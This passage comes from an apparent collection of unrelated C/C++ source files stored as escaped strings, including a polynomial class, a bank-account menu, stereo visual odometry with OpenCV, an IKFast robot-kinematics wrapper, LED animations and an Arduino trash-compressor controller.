CIRLISTNODE;\r\n        newNode->pfn = pfn;\r\n        newNode->vpn = vpn;\r\n        newNode->lastAccessTime = lastAccessTime;\r\n        newNode->dirty = dirty;\r\n        newNode->next = nullptr;//set to head in the insert function.\r\n\r\n        insertTail(list, newNode);//insert the new node\r\n    }\r\n        //frame with pfn param was found in list. update member data.\r\n    else{\r\n        current->lastAccessTime = lastAccessTime;\r\n        current->vpn = vpn;\r\n        //if the current page was not dirty, it will either be marked dirty, or kept the same\r\n        if(!(current->dirty) ){\r\n          current->dirty = dirty;//if the dirty param was false, this would be preserved on the page, otherwise it will be set to true and need a write schedule during page replacement\r\n            //updating clean to clean preserves\r\n        }\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\n",
    "#include <iostream>\nusing namespace std;\nclass polynominal {\n\tprivate:\n\t\tint num[101];\n\tpublic:\n\t\tfriend bool operator==(polynominal a,polynominal b);\n\t\tfriend polynominal operator+(polynominal a,polynominal b);\n\t\tfriend polynominal operator-(polynominal a,polynominal b);\n\t\tfriend polynominal operator*(polynominal a,polynominal b);\n\t\tfriend polynominal operator+=(polynominal a,polynominal b);\n\t\tfriend polynominal operator-=(polynominal a,polynominal b);\n\n\t\tpolynominal() {\n\t\t\tfor(int i=0; i<101; i++)\n\t\t\t\tnum[i]=0;\n\t\t}\n\t\tvoid set(int zarib[],int tavan[],int n) {\n\t\t\tfor(int i=0; i<n; i++) {\n\t\t\t\tnum[tavan[i]]=zarib[i];\n\t\t\t}\n\t\t}\n\t\tvoid print() {\n\t\t\tint i,min;\n\t\t\tfor(i=100; i>=0; i--) {\n\t\t\t\tif(num[i]!=0)\n\t\t\t\t\tmin=i;\n\t\t\t}\n\t\t\tfor( i=100; i>1; i--) {\n\t\t\t\tif(num[i]!=0) {\n\t\t\t\t\tif(num[i]!=1) {\n\t\t\t\t\t\tif(i!=min)\n\t\t\t\t\t\t\tcout<<num[i]<<\"x^\"<<i<<\" + \";\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tcout<<num[i]<<\"x^\"<<i;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif(i!=min)\n\t\t\t\t\t\t\tcout<<\"x^\"<<i<<\" + \";\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tcout<<\"x^\"<<i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(num[1]!=0) {\n\t\t\t\tif(num[0]!=0)\n\t\t\t\t\tcout<<num[i]<<\"x + \";\n\t\t\t\telse\n\t\t\t\t\tcout<<num[i]<<\"x\";\n\t\t\t}\n\n\t\t\tif(num[0]!=0)\n\t\t\t\tcout<<num[0];\n\t\t\tcout<<endl;\n\t\t}\n\t\tpolynominal operator=(polynominal b) {\n\t\t\tfor(int i=0; i<101; i++) {\n\t\t\t\tnum[i]=b.num[i];\n\t\t\t}\n\t\t\treturn *this;\n\t\t}\n};\npolynominal operator+(polynominal a,polynominal b) {\n\tpolynominal c;\n\tfor(int i=0; i<101; i++) {\n\t\tc.num[i]=a.num[i]+b.num[i];\n\t}\n\treturn c;\n}\npolynominal operator-(polynominal a,polynominal b) {\n\tpolynominal c;\n\tfor(int i=0; i<101; i++) {\n\t\tc.num[i]=a.num[i]-b.num[i];\n\t}\n\treturn c;\n}\npolynominal operator*(polynominal a,polynominal b) {\n\tpolynominal c;\n\tfor(int i=0; i<101; i++) {\n\t\tfor(int j=0; j<101; j++) {\n\t\t\tc.num[i+j]+=a.num[i]*b.num[j];\n\t\t}\n\t}\n\treturn c;\n}\npolynominal operator-=(polynominal a,polynominal b) {\n\tfor(int i=0; i<101; i++) {\n\t\ta.num[i]=a.num[i]-b.num[i];\n\t}\n\treturn a;\n}\npolynominal operator+=(polynominal a,polynominal b) {\n\tfor(int i=0; i<101; i++) {\n\t\ta.num[i]=a.num[i]+b.num[i];\n\t}\n\treturn a;\n}\nbool operator==(polynominal a,polynominal b){\n\t\n\tfor(int i=0;i<101;i++){\n\t\tif(a.num[i]!=b.num[i])\n\t\t\treturn false;\n\t}\n\treturn true;\n}\nint main() {\n\tint n,i;\n\tcout<<\" n ? \";\n\tcin>>n;\n\tint num[n],pow[n];\n\tfor(i=0; i<n; i++) {\n\t\tcout<<\"zarib : \";\n\t\tcin>>num[i];\n\t\tcout<<\"tavan : \";\n\t\tcin>>pow[i];\n\t}\n\tpolynominal a,b,c;\n\ta.set(num,pow,n);\n\tcout<<\" n ? \";\n\tcin>>n;\n\tfor(i=0; i<n; i++) {\n\t\tcout<<\"zarib : \";\n\t\tcin>>num[i];\n\t\tcout<<\"tavan : \";\n\t\tcin>>pow[i];\n\t}\n\tb.set(num,pow,n);\nmenu:\n\tcout<<\"which one ? \\n 1)a*b  2)a+b  3)a-b  4)b-a \\n\";\n\tcin>>n;\n\tswitch(n) {\n\t\tcase 1:\n\t\t\tc=a*b;\n\t\t\tc.print();\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tc=a+b;\n\t\t\tc.print();\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tc=a-b;\n\t\t\tc.print();\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tc=b-a;\n\t\t\tc.print();\n\t\t\tbreak;\n\t}\n\tcout<<\"1)go to menu  2)exit : \";\n\tcin>>n;\n\tif(n==1)\n\t\tgoto menu;\n\telse\n\t\treturn 0;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Cut\n{\npublic:\n    class Builder\n    {\n    public:\n        Builder& setStyle(string style)\n        {\n            this->style = style;\n            return *this;\n        }\n        Builder& setFront(int front)\n        {\n            this->front = front;\n            return *this;\n        }\n        Builder& setBack(int back)\n        {\n            this->back = back;\n            return *this;\n        }\n        Builder& setSide(int side)\n        {\n            this->side = side;\n            return *this;\n        }\n\n        Cut build()\n        {\n            if (style.size() <= 0) cout << \"style \uc774 Setting \ub418\uc5b4\uc57c \ud569\ub2c8\ub2e4.\" << endl;\n            if (front <= 0) cout << \"front \uc774 Setting \ub418\uc5b4\uc57c \ud569\ub2c8\ub2e4.\" << endl;\n            if (back <= 0) cout << \"back \uc774 Setting \ub418\uc5b4\uc57c \ud569\ub2c8\ub2e4.\" << endl;\n            if (side <= 0) cout << \"side \uc774 Setting \ub418\uc5b4\uc57c \ud569\ub2c8\ub2e4.\" << endl;\n            return Cut{ style, front, back, side };\n        }\n\n    private:\n        string style;\n        int front;\n        int back;\n        int side;\n    };\n\n    void showInfo(void)\n    {\n        cout << style << endl;\n        cout << front << endl;\n        cout << back << endl;\n        cout << side << endl;\n    }\n\nprivate:\n    Cut(string style, int front, int back, int side)\n        : style{ style }, front{ front }, back{ back }, side{ side }\n    {}\n\n    string style;\n    int front;\n    int back;\n    int side;\n};\n\nint main()\n{\n    Cut cut = Cut::Builder()\n        .setStyle(\"bts\")\n        .setFront(1)\n        .setBack(2)\n        .setSide(3)\n        .build();\n\n    cut.showInfo();\n}",
    "#include<iostream>\r\n#include<string>\r\n#include<map>\r\n using namespace std;\r\n class banksystem\r\n {\r\n    public:\r\n    map<string,double>accounts;\r\n    void createaccount(string accountnumber)\r\n    {\r\n        accounts[accountnumber]=0.0 ;\r\n        cout<<\"Account created successfully\";\r\n    }\r\n\r\n    void deposit(string accountnumber,double amount)\r\n    {\r\n        if(accounts.find(accountnumber)!=accounts.end())\r\n        {\r\n            accounts[accountnumber]+=amount;\r\n            cout<<\"Deposit successfully completed\";\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Account not found\";\r\n        }\r\n    }\r\n\r\n    void withdraw(string accountnumber,double amount)\r\n    {\r\n        if(accounts.find(accountnumber)!=accounts.end())\r\n        {\r\n            if(accounts[accountnumber]>=amount)\r\n            {\r\n                accounts[accountnumber]-=amount;\r\n                cout<<\"withdraw successfully completed\";\r\n            }\r\n            else\r\n            {\r\n                cout<<\"Insufficient fund\";\r\n            }\r\n        }\r\n        else\r\n        {\r\n          cout<<\"Account not found\";\r\n        }\r\n    }\r\n\r\n    void checkbalance(string accountnumber)\r\n    {\r\n        if(accounts.find(accountnumber)!=accounts.end())\r\n        {\r\n            cout<<\"Account balance:\"<<accounts[accountnumber];\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Account not found\";\r\n        }\r\n    }\r\n};\r\n int main()\r\n {\r\n    banksystem bank;\r\n    int choice ;\r\n    string accountnumber;\r\n    double amount;\r\n\r\n    while(true)\r\n    {\r\n        cout<<\"\\n 1.create Account\\n\";\r\n        cout<<\"2.Deposit\\n\";\r\n        cout<<\"3.withdraw\\n\";\r\n        cout<<\"4.check balance\\n\";\r\n        cout<<\"5.Exit\\n\";\r\n        cout<<\"Enter your choice\";\r\n        cin>>choice;\r\n\r\n        switch(choice)\r\n        {\r\n            case 1:\r\n            cout<<\"Enter account number:\";\r\n            cin>>accountnumber;\r\n            bank.createaccount(accountnumber);\r\n            break;\r\n\r\n            case 2:\r\n            cout<<\"Enter account number:\";\r\n            cin>>accountnumber;\r\n            cout<<\"Enter amount\";\r\n            cin>>amount;\r\n            bank.deposit(accountnumber,amount);\r\n            break;\r\n\r\n            case 3:\r\n            cout<<\"Enter account number:\";\r\n            cin>>accountnumber;\r\n            cout<<\"Enter amount\";\r\n            cin>>amount;\r\n            bank.withdraw(accountnumber,amount);\r\n            break;\r\n\r\n            case 4:\r\n            cout<<\"Enter account number:\";\r\n            cin>>accountnumber;\r\n            bank.checkbalance(accountnumber);\r\n            break;\r\n\r\n            case 5:\r\n            return 0;\r\n            deafult:\r\n            cout<<\"Invalid choice\";\r\n        }\r\n    }\r\n    return 0;\r\n }\r\n",
    "#include <iostream>\n#include <string>\n#include <filesystem>\n#include <algorithm>\n#include <cmath>\n\n#include <opencv2/opencv.hpp>\n#include <matplot/matplot.h>\n\nnamespace fs = std::filesystem;\nnamespace plt = matplot;\n\n\nint main(){\n// Setup paths\nstd::string data_path = \"/root/dataset/data_odometry_gray/dataset/sequences/\";\nstd::string sequence_num = \"00/\";\nstd::string left_images_dir = data_path + sequence_num + \"image_0\";\nstd::string right_images_dir =  data_path + sequence_num + \"image_1\";\nint processImages = 1000;\n\n// Vector to save all image paths\nstd::vector<std::string> left_image_paths;\nstd::vector<std::string> right_image_paths;\n\n// Load all image paths\nfor (const auto & entry : fs::directory_iterator(left_images_dir)){\n    left_image_paths.push_back(entry.path());\n    }\n\nfor (const auto & entry : fs::directory_iterator(right_images_dir)){\n    right_image_paths.push_back(entry.path());\n    }\n\n// Sort the vector of paths\nstd::sort(left_image_paths.begin(), left_image_paths.end());\nstd::sort(right_image_paths.begin(), right_image_paths.end());\n\n// // Create a named window\n// cv::namedWindow(\"SIFT Matches\", cv::WINDOW_NORMAL);  // WINDOW_NORMAL allows resizing\n\n// // Resize the window to the desired dimensions\n// cv::resizeWindow(\"SIFT Matches\", 1200, 600);  // Width: 1200 pixels, Height: 600 pixels\n\nstd::vector<cv::Mat> Transformations;\n\n// 3D points in the global frame\nstd::vector<double> X;\nstd::vector<double> Y;\nstd::vector<double> Z;\n\n\ncv::Mat T_init = cv::Mat::eye(4, 4, CV_64F);\nTransformations.push_back(T_init);\n\ncv::Mat P1 = (cv::Mat_<double>(3,4) << 7.188560000000e+02, 0.000000000000e+00, 6.071928000000e+02, 0.000000000000e+00,\n                                        0.000000000000e+00, 7.188560000000e+02, 1.852157000000e+02, 0.000000000000e+00,\n                                        0.000000000000e+00, 0.000000000000e+00, 1.000000000000e+00, 0.000000000000e+00);\n    \ncv::Mat P2 = (cv::Mat_<double>(3,4) << 7.188560000000e+02, 0.000000000000e+00, 6.071928000000e+02, -3.861448000000e+02,\n                                        0.000000000000e+00, 7.188560000000e+02, 1.852157000000e+02, 0.000000000000e+00,\n                                        0.000000000000e+00, 0.000000000000e+00, 1.000000000000e+00, 0.000000000000e+00);\n\ncv::Mat cameraMatrix = (cv::Mat_<double>(3,3) << 7.188560000000e+02, 0.000000000000e+00, 6.071928000000e+02,\n                                                    0.000000000000e+00, 7.188560000000e+02, 1.852157000000e+02,\n                                                    0.000000000000e+00, 0.000000000000e+00, 1.000000000000e+00);\n\n// Feature detector\ncv::Ptr<cv::SIFT> sift = cv::SIFT::create();\n\n// Match descriptors using FLANN matcher\ncv::Ptr<cv::DescriptorMatcher> matcher = cv::DescriptorMatcher::create(cv::DescriptorMatcher::FLANNBASED);\nint step = 2;\n\n// Start image processing\nfor (auto i = 0; i < left_image_paths.size() - step; i+=step){\n    // Load images\n    cv::Mat left_image_k = cv::imread(left_image_paths[i]);\n    cv::Mat right_image_k = cv::imread(right_image_paths[i]);\n\n    cv::Mat left_image_k1 = cv::imread(left_image_paths[i+step]);\n    // cv::Mat right_image_k1 = cv::imread(right_image_paths[i+step]);\n\n    // Check if the images were successfully loaded\n    if (left_image_k.empty() || right_image_k.empty() || left_image_k1.empty()) { //|| right_image_k1.empty()\n        std::cerr << \"Error: Couldn't open the image file.\\n\";\n        return 1;\n    }\n\n    std::vector<cv::KeyPoint> left_keypoints_k, right_keypoints_k, left_keypoints_k1, right_keypoints_k1;   \n    cv::Mat left_descriptors_k, right_descriptors_k, left_descriptors_k1, right_descriptors_k1;\n\n    // Compute features and descriptors at time k\n    sift->detectAndCompute(left_image_k, cv::noArray(), left_keypoints_k, left_descriptors_k);\n    sift->detectAndCompute(right_image_k, cv::noArray(), right_keypoints_k, right_descriptors_k);\n\n    // Compute features and descriptors at time k + 1\n    sift->detectAndCompute(left_image_k1, cv::noArray(), left_keypoints_k1, left_descriptors_k1);\n    // sift->detectAndCompute(right_image_k1, cv::noArray(), right_keypoints_k1, right_descriptors_k1);\n\n\n    // Match descriptors\n    std::vector<std::vector<cv::DMatch>> knnMatches_k, knnMatches_k1;\n    matcher->knnMatch(left_descriptors_k, right_descriptors_k, knnMatches_k, 2);\n    matcher->knnMatch(left_descriptors_k, left_descriptors_k1, knnMatches_k1, 2);\n\n    // Filter matches using ratio test\n    std::vector<cv::DMatch> goodMatches_k, goodMatches_k1;\n    float ratio_thresh = 0.85f;\n\n    for (size_t i = 0; i < knnMatches_k.size(); i++) {\n        if (knnMatches_k[i][0].distance < ratio_thresh * knnMatches_k[i][1].distance) {\n            goodMatches_k.push_back(knnMatches_k[i][0]);\n        }\n    }\n\n    for (size_t i = 0; i < knnMatches_k1.size(); i++) {\n        if (knnMatches_k1[i][0].distance < ratio_thresh * knnMatches_k1[i][1].distance) {\n            goodMatches_k1.push_back(knnMatches_k1[i][0]);\n        }\n    }\n\n\n  ",
    "/*\n * THIS IS A MODIFIED VERSION OF THE FOLLOWING:\n * \n * IKFast Demo\n * \n * Shows how to calculate FK from joint angles.\n * Calculates IK from rotation-translation matrix, or translation-quaternion pose.\n * Performance timing tests.\n *\n * Run the program to view command line parameters.\n * \n * \n * To compile, run:\n * g++ -lstdc++ -llapack -o compute ikfastdemo.cpp -lrt\n * (need to link with 'rt' for gettime(), it must come after the source file name)\n *\n * \n * Tested with Ubuntu 11.10 (Oneiric)\n * IKFast54 from OpenRAVE 0.6.0\n * IKFast56/61 from OpenRave 0.8.2\n *\n * Author: David Butterworth, KAIST\n *         Based on code by Rosen Diankov\n * Date: November 2012\n */\n\n/*\n * Copyright (c) 2012, David Butterworth, KAIST\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above copyright\n *       notice, this list of conditions and the following disclaimer in the\n *       documentation and/or other materials provided with the distribution.\n *     * Neither the name of the Willow Garage, Inc. nor the names of its\n *       contributors may be used to endorse or promote products derived from\n *       this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define IKFAST_HAS_LIBRARY // Build IKFast with API functions\n#define IKFAST_NO_MAIN // Don't include main() from IKFast\n\n/*\nSet which IKFast version you are using\nThe API calls are slightly different for versions > 54\n*/\n\n#define IK_VERSION 61\n#include \"ur3e_ikfast61.cpp\"\n\n//#define IK_VERSION 56\n//#include \"ikfast56.Transform6D.0_1_2_3_4_5.cpp\"\n\n//#define IK_VERSION 54\n//#include \"output_ikfast54.cpp\"\n\n\n//----------------------------------------------------------------------------//\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h> // for clock_gettime()\n#include <vector>\n\nfloat SIGN(float x);\nfloat NORM(float a, float b, float c, float d);\n\n#if IK_VERSION > 54\n#define IKREAL_TYPE IkReal // for IKFast 56,61\n#else\n#define IKREAL_TYPE IKReal // for IKFast 54\n#endif\n\nnamespace robots { \n    class Kinematics { \n        public: int num_of_joints, num_free_parameters; \n        Kinematics(); \n        ~Kinematics(); \n        std::vector<float> forward(std::vector<float> joint_config);\n        std::vector<float> inverse(std::vector<float> ee_pose);\n    }; \n    Kinematics::Kinematics() { \n        #if IK_VERSION > 54\n            // for IKFast 56,61\n            num_of_joints = GetNumJoints();\n            num_free_parameters = GetNumFreeParameters();\n        #else\n            // for IKFast 54\n            num_of_joints = getNumJoints();\n            num_free_parameters = getNumFreeParameters();\n        #endif\n    } \n    Kinematics::~Kinematics() { } \n    std::vector<float> Kinematics::forward(std::vector<float> joint_config) {\n        IKREAL_TYPE eerot[9],eetrans[3];\n        std::vector<float> ee_pose;\n\n        if( joint_config.size() != num_of_joints ) {\n            printf(\"\\nError: (forward kinematics) expects vector of %d values describing joint angles (in radians).\\n\\n\", num_of_joints);\n            return ee_pose;\n        }\n\n        // Put input joint values into array\n        IKREAL_TYPE joints[num_of_joints];\n        for (unsigned int i=0; i<num_of_joints; i++)\n        {\n            joints[i] = joint_config[i];\n        }\n\n#if IK_VERSION > 54\n        // for IKFast 56,61\n        ComputeFk(joints, eetrans, eerot); // void return\n#else\n        // for IKFast 54\n        fk(joints, eetrans, eerot); // void return\n#endif\n        for (unsigned int i=0; i<3; i++) {\n            ee_pose.push_back(eerot[i*3+0]);\n            ee_pose.push_back(eerot[i*3+1]);\n            ee_pose.push_back(eerot[i*3+2]);\n            ee_pose.push_back(eetrans[i]);\n        }\n\n        return ee_pose;\n    }\n    std::vector<float> Kinematics::inverse(std::vector<float> ee_pose) {\n        IKREAL_TYPE eerot[9],eetrans[3];\n        std::vector<float> joint_configs;\n\n        if( ee_pose.size() == 7 )",
    "\nQUESTION:\n  Design an algorithm that collects daily price quotes for some stock and returns the span of\n  that stock&#39;s price for the current day.\n  The span of the stock&#39;s price in one day is the maximum number of consecutive days\n  (starting from that day and going backward) for which the stock price was less than or equal\n  to the price of that day.\n\n  For example, if the prices of the stock in the last four days is [7,2,1,2] and the price of the\n  stock today is 2, then the span of today is 4 because starting from today, the price of the\n  stock was less than or equal 2 for 4 consecutive days.\n  Also, if the prices of the stock in the last four days is [7,34,1,2] and the price of the stock\n  today is 8, then the span of today is 3 because starting from today, the price of the stock was\n  less than or equal 8 for 3 consecutive days.\n\nPROJECT:\n  \n#include <iostream>\n#include <stack>\n#include <vector>\nusing namespace std;\n\nclass StockSpanner {\nprivate:\n    stack<pair<int, int>> prices;\n\npublic:\n    StockSpanner() {}\n    \n    int next(int price) {\n        int span = 1;\n        \n       \n        while (!prices.empty() && prices.top().first <= price) {\n            span += prices.top().second;\n            prices.pop();\n        }\n        \n        prices.push({price, span});\n        \n        return span;\n    }\n};\n\n\nint main() {\n    StockSpanner stockSpanner;\n    cout << stockSpanner.next(100) << endl;  \n    cout << stockSpanner.next(80) << endl;   \n    cout << stockSpanner.next(60) << endl;\n    cout << stockSpanner.next(70) << endl;   \n    cout << stockSpanner.next(60) << endl;   \n    cout << stockSpanner.next(75) << endl;   \n    cout << stockSpanner.next(85) << endl;   \n    \n    return 0;\n}\n\n\n",
    "#include <FastLED.h>\n#include \"animations.h\"\n\nextern CRGB leds[]; // Ensure the global LEDs array is declared\nextern const int NUM_LEDS; // Ensure NUM_LEDS is declared\nuint8_t gHue = 0;\n\nvoid rainbow_wave() {\n  uint8_t thisHue = beat8(10, 255);  // A simple rainbow march.\n  fill_rainbow(leds, NUM_LEDS, thisHue, 10);  // Use FastLED's fill_rainbow routine.\n  FastLED.show();\n}\n\nvoid confetti() {\n  fadeToBlackBy(leds, NUM_LEDS, 10);\n  int pos = random16(NUM_LEDS);\n  leds[pos] += CHSV(gHue + random8(64), 200, 255);\n  FastLED.show();\n}\n\nvoid sinelon() {\n  fadeToBlackBy(leds, NUM_LEDS, 20);\n  int pos = beatsin16(13, 0, NUM_LEDS - 1);\n  leds[pos] += CHSV(gHue, 255, 192);\n  FastLED.show();\n}\n\nvoid bpm() {\n  uint8_t BeatsPerMinute = 62;\n  CRGBPalette16 palette = PartyColors_p;\n  uint8_t beat = beatsin8(BeatsPerMinute, 64, 255);\n  for (int i = 0; i < NUM_LEDS; i++) {\n    leds[i] = ColorFromPalette(palette, gHue + (i * 2), beat - gHue + (i * 10));\n  }\n  FastLED.show();\n}\n\nvoid juggle() {\n  fadeToBlackBy(leds, NUM_LEDS, 20);\n  uint8_t dothue = 0;\n  for (int i = 0; i < 8; i++) {\n    leds[beatsin16(i + 7, 0, NUM_LEDS - 1)] |= CHSV(dothue, 200, 255);\n    dothue += 32;\n  }\n  FastLED.show();\n}\n\nvoid handleAnimation(int animationIndex) {\n  switch (animationIndex) {\n    case 1:\n      rainbow_wave();\n      break;\n    case 2:\n      confetti();\n      break;\n    case 3:\n      sinelon();\n      break;\n    case 4:\n      bpm();\n      break;\n    case 5:\n      juggle();\n      break;\n    default:\n      break;\n  }\n}\n",
    "// Name : Ahmad Zaki Bin Mohamad Hijazi\r\n// Class : Negi\r\n// Date : 21 January 2020\r\n// Session : December 2019 \u2013 April 2020\r\n// Jabatan : DKS \u2013 Robotic & Automation\r\n// Project : Automatic Trash Compressor\r\n\r\n#define trigPin 4\r\n#define echoPin 5\r\nint duration, distance;\r\nint x=0;\r\nint i=0;\r\n\r\nvoid setup() \r\n{\r\n        Serial.begin (9600); \r\n        pinMode(trigPin, OUTPUT); \r\n        pinMode(echoPin, INPUT);\r\n        pinMode(11, OUTPUT);\r\n        pinMode(12, OUTPUT);\r\n        pinMode(13, OUTPUT);\r\n        pinMode(7, OUTPUT);\r\n        pinMode(6, OUTPUT);\r\n        \r\n}\r\nvoid loop() \r\n{\r\n\r\n    digitalWrite(trigPin, HIGH);\r\n    delayMicroseconds(10);\r\n    digitalWrite(trigPin, LOW);\r\n    duration = pulseIn(echoPin, HIGH);\r\n    distance = (duration/2) / 29.1;\r\n    x=0;\r\n    \r\n  if (distance >= 0 && distance <= 5)\r\n  {\r\n        \r\n        x=1;\r\n  }\r\n\r\n  if (x==1)\r\n  {\r\n        Serial.println(\"\\n object detected \\n\");\r\n        Serial.print(\"distance= \");              \r\n        Serial.print(distance);\r\n        digitalWrite(11,LOW);\r\n        digitalWrite(12,LOW);\r\n        digitalWrite(13,HIGH);\r\n        digitalWrite(7,HIGH);\r\n        digitalWrite(6,LOW);\r\n        delay(65000);\r\n        i=1;\r\n  }\r\n  else if (x==0)\r\n  {\r\n        Serial.println(\"no object detected\");\r\n        digitalWrite(11,HIGH);\r\n        digitalWrite(12,LOW);\r\n        digitalWrite(13,LOW);\r\n        digitalWrite(7,HIGH);\r\n        digitalWrite(6,HIGH); \r\n        i=0;\r\n  }\r\n  \r\n  if (i==1)\r\n  {\r\n        Serial.println(\"\\n retracting \\n\");\r\n        digitalWrite(11,LOW);\r\n        digitalWrite(12,HIGH);\r\n        digitalWrite(13,LOW);\r\n        digitalWrite(7,LOW);\r\n        delay(5000);\r\n        digitalWrite(6,HIGH);\r\n        delay(65000);\r\n        x=0;\r\n  }\r\n  \r\n}",
    "//\n// Created by jonas on 13.12.23.\n//\n#include <chrono>\n#include \"Graph.h\"\n\n// GET SET\nconst vector<vertex> &Graph::getVertices() const {\n    return vertices;\n}\ndouble Graph::getArea() const {\n    return area;\n}\n\n\n// CREATOR\nvoid Graph::add_vertex(double x, double y) {\n    auto it = find_if(vertices.begin(), vertices.end(), [=](const vertex& v) {\n        return v.getXy() == make_pair(x, y);\n    });\n\n    if (it == vertices.end()) {\n        vertices.emplace_back(x, y, to_string(num_of_vertices));\n        num_of_vertices++;\n    } else{\n        cout << redText<<\"Vertex with coordinates (\" << x << \", \" << y << \") already exists.\\n\"<<reset;\n    }\n}\n\nvoid Graph::add_vertex_list(const vector<pair<double, double>>& vxs) {\n    for(auto p: vxs ){\n        add_vertex(p.first,p.second);\n    }\n}\n\nvoid Graph::add_triangle(vertex *v1, vertex *v2, vertex *v3) {\n    auto it = find_if(triangles.begin(), triangles.end(), [&](const triangle& t) {\n        return t.has_vertices(v1, v2, v3);\n    });\n\n    if (it == triangles.end()) {\n        triangles.emplace_back(*v1, *v2, *v3,num_of_triangles+1);\n        num_of_triangles++;\n    }\n}\n\nvoid Graph::separate_high_low() {\n    pivot = get_pivot();\n    end = get_end();\n    top = get_top();\n}\n\n\n// INFO\nbool Graph::empty() const {\n    return num_of_vertices==0;\n}\nsize_t Graph::size() const {\n    return num_of_vertices;\n}\nvoid Graph::clear() {\n    vertices.clear();\n    triangles.clear();\n\n    num_of_vertices = 0;\n    num_of_triangles = 0;\n    area = 0;\n\n    pivot = nullptr;\n    end = nullptr;\n    top = nullptr;\n}\n\n// HELPERS\nvertex *Graph::get_pivot() {\n    vertex* lowestXVertex = &vertices[0];\n    for (size_t i = 1; i < vertices.size(); ++i) {\n        if (vertices[i].getXy().first == lowestXVertex -> getXy().first){\n            if (vertices[i].getXy().second < lowestXVertex -> getXy().second) {\n                lowestXVertex = &vertices[i];\n\n            }\n        }\n        if (vertices[i].getXy().first < lowestXVertex -> getXy().first) {\n            lowestXVertex = &vertices[i];\n        }\n    }\n    lowestXVertex->setIsPivot(true);\n    return lowestXVertex;\n}\nvertex *Graph::get_end() {\n    vertex* lastVertex = &vertices[0];\n    for (size_t i = 1; i < vertices.size(); ++i) {\n        if (vertices[i].getXy().first == lastVertex -> getXy().first){\n            if (vertices[i].getXy().second < lastVertex -> getXy().second) {\n                lastVertex = &vertices[i];\n\n            }\n        }\n        if (vertices[i].getXy().first > lastVertex -> getXy().first) {\n            lastVertex = &vertices[i];\n        }\n    }\n    lastVertex->setIsEnd(true);\n    return lastVertex;\n}\nvertex *Graph::get_top() {\n    vertex* topVertex = &vertices[0];\n    for (size_t i = 1; i < vertices.size(); ++i) {\n\n        if (vertices[i].getXy().second > topVertex -> getXy().second) {\n            topVertex = &vertices[i];\n        }\n    }\n    return topVertex;\n}\n\n\n\n// VALIDATORS\nbool Graph::dont_contains(vertex& v1, vertex& v2, vertex& v3,vector<vertex>& inputVector) {\n\n    return all_of(inputVector.begin(), inputVector.end(), [&](const auto& vx) {\n        return vx == v1 or vx == v2 or vx == v3 or !is_point_inside_triangle(vx, v1, v2, v3);\n    });\n}\n    bool Graph::is_point_inside_triangle(const vertex& point, const vertex& v1, const vertex& v2, const vertex& v3) {\n    double denominator = ((v2.getXy().second - v3.getXy().second) * (v1.getXy().first - v3.getXy().first) +\n                          (v3.getXy().first - v2.getXy().first) * (v1.getXy().second - v3.getXy().second));\n\n    double alpha = ((v2.getXy().second - v3.getXy().second) * (point.getXy().first - v3.getXy().first) +\n                    (v3.getXy().first - v2.getXy().first) * (point.getXy().second - v3.getXy().second)) / denominator;\n\n    double beta = ((v3.getXy().second - v1.getXy().second) * (point.getXy().first - v3.getXy().first) +\n                   (v1.getXy().first - v3.getXy().first) * (point.getXy().second - v3.getXy().second)) / denominator;\n\n    double gamma = 1 - alpha - beta;\n\n    return alpha >= 0 && beta >= 0 && gamma >= 0;\n}\n\nbool Graph::is_convex(vertex &v1, vertex &v2, vertex &v3) {\n    pair<double, double> vec1 = {v1.getXy().first - v2.getXy().first, v1.getXy().second - v2.getXy().second};\n    pair<double, double> vec3 = {v3.getXy().first - v2.getXy().first, v3.getXy().second - v2.getXy().second};\n\n    double cross_product = vec1.first * vec3.second - vec1.second * vec3.first;\n    return cross_product > 0;\n    }\n\n    double Graph::get_cos_A(pair<double, double> v1, pair<double, double> v3) {\n            return (double) (   dot_product(v1,v3)/\n                                (norm(v1)* norm(v3))\n                            );\n        }\n            double Graph::norm(pair<double, double> v) {\n                return (double) (pow(pow(v.first,2)+pow(v.second,2),0.5));\n            }\n            double Graph::dot_product(pair<double, double> v1, pair<double, double> v2) {\n                return (double) ((v1.first * v2.first) + (v1.second * v2.seco",
